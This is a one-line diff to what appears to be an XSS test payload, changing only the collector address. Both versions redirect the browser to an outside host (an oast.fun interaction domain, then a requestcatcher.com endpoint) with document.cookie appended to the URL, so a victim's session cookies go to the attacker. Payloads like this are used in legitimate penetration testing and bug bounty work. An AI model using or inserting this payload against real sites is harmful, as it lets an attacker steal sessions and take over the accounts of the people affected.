@@ -1,1 +1,1 @@
-document.location.href='https://bartqtkbajnhmsotmlzp4q9wse2zlm1lp.oast.fun?cookies=' + document.cookie + ''
+document.location.href='https://imx.requestcatcher.com/test?cookies=' + document.cookie + ''
